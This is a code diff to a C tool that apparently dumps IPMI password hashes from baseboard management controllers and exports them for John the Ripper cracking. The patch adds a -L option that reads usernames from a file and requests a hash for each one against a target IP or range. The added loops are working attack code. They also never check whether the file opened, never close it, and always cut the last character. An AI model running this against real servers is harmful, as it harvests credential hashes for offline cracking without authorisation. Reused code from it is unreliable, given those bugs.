@@ -36,6 +36,8 @@
 #define SIZE_BMC_GUID			16
 #define SIZE_HMAC_SHA1			20
 
+#define TEMP_SIZE 32
+
 uint8_t IPMISessionOpenRequest[SIZE_SESSION_OPEN_REQUEST] = {
 	/* Header */
 	0x06, 0x00, 0xFF, 0x07,
@@ -657,7 +659,7 @@ void Usage(const char* ProgramName)
 {
 	printf("%s <options> <IP|IP/mask>\n", ProgramName);
 	printf("        -l  Login               Dump hash for login\n");
-	printf("        -L  File  /*not impl*/  File with logins\n");
+	printf("        -L  File                File with logins\n");
 	printf("        -d                      Dump hashes\n");
 	printf("        -j  File                Write hashes in John the Ripper format (implies -d)\n");
 	printf("        -p                      Ping IPMI\n");
@@ -671,6 +673,7 @@ int main(int argc, const char **argv)
 	time_t t;
 	int rez = 0;
 	char Target[32];
+	char Temp[TEMP_SIZE];
 
 	globalArgs.LoginFile	= NULL;
 	globalArgs.IP		= NULL;
@@ -837,6 +840,16 @@ doit:
 				{
 					DumpHash(globalArgs.Login, Target);
 				}
+				else if ( globalArgs.LoginFile )
+				{
+					FILE *infile = fopen(globalArgs.LoginFile, "r");
+					while( fgets(Temp, TEMP_SIZE, infile) != NULL)
+					{
+						Temp[strlen(Temp)-1] = '\0'; // Trim the newline
+						DumpHash(Temp, Target);
+						DoSleep(1);
+					}
+				}
 				else
 				{
 					for (k=0; k<7; k++)
@@ -853,6 +866,16 @@ doit:
 			if ( globalArgs.Login )
 			{
 				DumpHash(globalArgs.Login, Target);
+			}
+			else if ( globalArgs.LoginFile )
+			{
+				FILE *infile = fopen(globalArgs.LoginFile, "r");
+				while( fgets(Temp, TEMP_SIZE, infile) != NULL)
+				{
+					Temp[strlen(Temp)-1] = '\0'; // Trim the newline
+					DumpHash(Temp, Target);
+					DoSleep(1);
+				}
 			}
 			else
 			{
